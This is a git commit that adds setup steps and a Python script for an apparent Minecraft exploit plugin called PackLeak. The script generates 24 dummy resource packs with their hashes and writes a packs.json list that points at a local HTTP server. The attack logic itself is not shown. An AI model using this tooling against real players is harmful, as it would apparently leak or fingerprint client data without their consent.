f602cfccf941889feca7cd45c77372330bfc95e5
Laggy <renlin456123@gmail.com>
2025-07-01 20:52:30 +0800

    Add http server

---
+++ README.md
@@ -0,0 +1,5 @@
+
+To run the exploit:
+
+Go to `http_pack_server` and host a http server there.
+Then, copy `http_pack_server/packs.json` into `run/plugins/PackLeak/packs.json`.
---
+++ http_pack_server/gen_packs.py
@@ -0,0 +1,26 @@
+import zipfile
+import hashlib
+import uuid
+import json
+
+# NOTE: Put the http server URL in here
+SERVER_URL = "http://127.0.0.1:8000"
+
+packs = []
+
+for i in range(0, 24):
+    with zipfile.ZipFile(f"packs/{i}", mode="w") as zf:
+        zf.writestr(
+            "pack.mcmeta",
+            '{"pack":{"pack_format":22,"supported_formats":[22,1000],"description":"pack '
+            + str(i)
+            + '"}}',
+        )
+
+    with open(f"packs/{i}", "rb") as f:
+        hash = hashlib.file_digest(f, "sha1").hexdigest()
+
+    packs.append({"url": f"{SERVER_URL}/packs/{i}", "uuid": str(uuid.uuid4()), "hash": hash})
+
+with open("packs.json", "w") as f:
+    json.dump(packs, f, indent=4)
